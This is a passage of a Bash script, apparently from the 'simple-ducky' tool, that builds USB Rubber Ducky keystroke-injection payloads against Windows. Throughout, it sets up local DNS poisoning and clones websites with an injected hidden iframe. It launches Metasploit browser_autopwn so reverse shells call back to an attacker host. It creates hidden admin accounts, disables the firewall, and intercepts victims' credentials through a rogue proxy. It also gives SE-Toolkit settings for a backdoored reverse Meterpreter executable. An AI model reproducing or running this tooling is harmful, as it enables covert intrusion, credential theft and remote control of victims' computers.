	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mStopping your webserver...\e[0m"
	echo ""
	sleep 2
	service apache2 stop
	clear
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	clear
	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
	echo ""
	sleep 2
	x-terminal-emulator -e se-toolkit &
	clear
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo "1) Social-Engineering Attacks"
	echo ""
	echo "2) Website Attack Vectors"
	echo ""
	echo "3) Java Applet Attack Method"
	echo ""
	echo "4) Site Cloner"
	echo ""
	echo "5) Are you using NAT/Port Forwarding [yes|no]: no"
	echo ""
	echo "6) IP address or hostname for the reverse connection: $attackerip"
	echo ""
	echo "7) Enter the url to clone: (Example: http://www.thisisafakesite.com)"
	echo ""
	echo "8) What payload do you want to generate: Windows Reverse_TCP Meterpreter"
	echo ""
	echo "9) Backdoored Executable (BEST)"
	echo ""
	echo "10) PORT of the listener [443]: $attackerport" 
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	xdg-open /usr/share/simple-ducky/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | SE-Toolkit w/UAC (Windows 8)
#################################################################################
f_setlocaldnsWIN8nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. Couple this attack with the SE-Toolkit's website cloner and you will be unstoppable."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/setlocaldnsWIN8nouac.conf > /usr/share/simple-ducky/payload_del1.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del1.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mStopping your webserver...\e[0m"
	echo ""
	sleep 2
	service apache2 stop
	clear
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	clear
	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
	echo ""
	sleep 2
	x-terminal-emulator -e se-toolkit &
	clear
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo "1) Social-Engineering Attacks"
	echo ""
	echo "2) Website Attack Vectors"
	echo ""
	echo "3) Java Applet Attack Method"
	echo ""
	echo "4) Site Cloner"
	echo ""
	echo "5) Are you using NAT/Port Forwarding [yes|no]: no"
	echo ""
	echo "6) IP address or hostname for the reverse connection: $attackerip"
	echo ""
	echo "7) Enter the url to clone: (Example: http://www.thisisafakesite.com)"
	echo ""
	echo "8) What payload do you want to generate: Windows Reverse_TCP Meterpreter"
	echo ""
	echo "9) Backdoored Executable (BEST)"
	echo ""
	echo "10) PORT of the listener [443]: $attackerport" 
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	xdg-open /usr/share/simple-ducky/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | Browser_Autopwn w/UAC (Win Vista/7)
#################################################################################
f_autopwnlocaldnsVIS7uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. This payload uses Metasploit's Browser_Autopwn Auxilary module along with an evil iframe to perform the attack. In addition to the DNS poisoning this attack; creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance."
	echo -e "\e[1;31mNote:\e[0m Not all websites like to be cloned using this method (wget)... Browser_autopwn is a finicky method to exploit browsers. If the victim's browser and computer are fully patched this method will likely fail."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	echo -e "\e[1;34mLet's start with the inject.bin file...\e[0m"
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/autopwnlocaldnsVIS7uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del5.txt > /usr/share/simple-ducky/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del6.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	rm /usr/share/simple-ducky/payload_del5.txt
	rm /usr/share/simple-ducky/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLet's clone a website...\e[0m"
	echo "" 
	read -p "What's the FQDN that you would like to clone (example: https://www.example.com)? " attackerfqdn
	echo -e ""
	clear
	rm index.html
	clear
	rm /var/www/index.html
	clear
	echo -e "\e[1;34mCloning $attackerfqdn and injecting an evil iframe...\e[0m"
	echo ""
	sleep 2
	wget $attackerfqdn
	echo "<iframe src="http://$attackerip:8080/duck" width="0" height="0">" >> index.html
	cp index.html /var/www/index.html
	rm index.html
	clear
	echo -e "\e[1;34mRestarting your Apache Server...\e[0m"
	echo ""
	sleep 2
	service apache2 restart
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	sleep 2
	clear
	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
	echo ""
	sleep 3
	x-terminal-emulator -e msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	xdg-open /usr/share/simple-ducky/ &
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | Browser_Autopwn w/o UAC (Win Vista/7)
#################################################################################
f_autopwnlocaldnsVIS7nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. This payload uses Metasploit's Browser_Autopwn Auxilary module along with an evil iframe to perform the attack. In addition to the DNS poisoning this attack; creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance."
	echo -e "\e[1;31mNote:\e[0m Not all websites like to be cloned using this method (wget)... Browser_autopwn is a finicky method to exploit browsers. If the victim's browser and computer are fully patched this method will likely fail."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	echo -e "\e[1;34mLet's start with the inject.bin file...\e[0m"
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/autopwnlocaldnsVIS7nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del5.txt > /usr/share/simple-ducky/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del6.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	rm /usr/share/simple-ducky/payload_del5.txt
	rm /usr/share/simple-ducky/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLet's clone a website...\e[0m"
	echo "" 
	read -p "What's the FQDN that you would like to clone (example: https://www.example.com)? " attackerfqdn
	echo -e ""
	clear
	rm index.html
	clear
	rm /var/www/index.html
	clear
	echo -e "\e[1;34mCloning $attackerfqdn and injecting an evil iframe...\e[0m"
	echo ""
	sleep 2
	wget $attackerfqdn
	echo "<iframe src="http://$attackerip:8080/duck" width="0" height="0">" >> index.html
	cp index.html /var/www/index.html
	rm index.html
	clear
	echo -e "\e[1;34mRestarting your Apache Server...\e[0m"
	echo ""
	sleep 2
	service apache2 restart
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	sleep 2
	clear
	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
	echo ""
	sleep 3
	x-terminal-emulator -e msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	xdg-open /usr/share/simple-ducky/ &
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | Browser_Autopwn w/UAC (Windows 8)
#################################################################################
f_autopwnlocaldnsWIN8uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. This payload uses Metasploit's Browser_Autopwn Auxilary module along with an evil iframe to perform the attack. In addition to the DNS poisoning this attack; creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance."
	echo -e "\e[1;31mNote:\e[0m Not all websites like to be cloned using this method (wget)... Browser_autopwn is a finicky method to exploit browsers. If the victim's browser and computer are fully patched this method will likely fail."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	echo -e "\e[1;34mLet's start with the inject.bin file...\e[0m"
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/autopwnlocaldnsWIN8uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del5.txt > /usr/share/simple-ducky/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del6.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	rm /usr/share/simple-ducky/payload_del5.txt
	rm /usr/share/simple-ducky/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLet's clone a website...\e[0m"
	echo "" 
	read -p "What's the FQDN that you would like to clone (example: https://www.example.com)? " attackerfqdn
	echo -e ""
	clear
	rm index.html
	clear
	rm /var/www/index.html
	clear
	echo -e "\e[1;34mCloning $attackerfqdn and injecting an evil iframe...\e[0m"
	echo ""
	sleep 2
	wget $attackerfqdn
	echo "<iframe src="http://$attackerip:8080/duck" width="0" height="0">" >> index.html
	cp index.html /var/www/index.html
	rm index.html
	clear
	echo -e "\e[1;34mRestarting your Apache Server...\e[0m"
	echo ""
	sleep 2
	service apache2 restart
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	sleep 2
	clear
	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
	echo ""
	sleep 3
	x-terminal-emulator -e msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	xdg-open /usr/share/simple-ducky/ &
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | Browser_Autopwn w/o UAC (Windows 8)
#################################################################################
f_autopwnlocaldnsWIN8nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. This payload uses Metasploit's Browser_Autopwn Auxilary module along with an evil iframe to perform the attack. In addition to the DNS poisoning this attack; creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance."
	echo -e "\e[1;31mNote:\e[0m Not all websites like to be cloned using this method (wget)... Browser_autopwn is a finicky method to exploit browsers. If the victim's browser and computer are fully patched this method will likely fail."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	echo -e "\e[1;34mLet's start with the inject.bin file...\e[0m"
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/autopwnlocaldnsWIN8nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payload_del5.txt > /usr/share/simple-ducky/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payload_del6.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	rm /usr/share/simple-ducky/payload_del5.txt
	rm /usr/share/simple-ducky/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLet's clone a website...\e[0m"
	echo "" 
	read -p "What's the FQDN that you would like to clone (example: https://www.example.com)? " attackerfqdn
	echo -e ""
	clear
	rm index.html
	clear
	rm /var/www/index.html
	clear
	echo -e "\e[1;34mCloning $attackerfqdn and injecting an evil iframe...\e[0m"
	echo ""
	sleep 2
	wget $attackerfqdn
	echo "<iframe src="http://$attackerip:8080/duck" width="0" height="0">" >> index.html
	cp index.html /var/www/index.html
	rm index.html
	clear
	echo -e "\e[1;34mRestarting your Apache Server...\e[0m"
	echo ""
	sleep 2
	service apache2 restart
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	sleep 2
	clear
	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
	echo ""
	sleep 3
	x-terminal-emulator -e msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	xdg-open /usr/share/simple-ducky/ &
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Proxy in the Middle (PiTM) | no admin needed (Win XP/Vista/7)
#################################################################################
f_proxyinthemiddleXPVIS7(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload sets up a proxy server on the vicitims machine. It then launches Burpsuite and allows the attacker to see everything that the victim browses to and it will even hand over the credentials to any website visited."
	echo -e "\e[1;31mNote:\e[0m This payload does not require any admin access. Although, some corporate networks man have policies in place to block normal users from altering the proxy settings."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What IP/domain would you like to use for your proxy server? " attackerip
	echo ""
	read -p "What port will you be using for your proxy server (example: 8081)? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/proxyinthemiddleXPVIS7.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
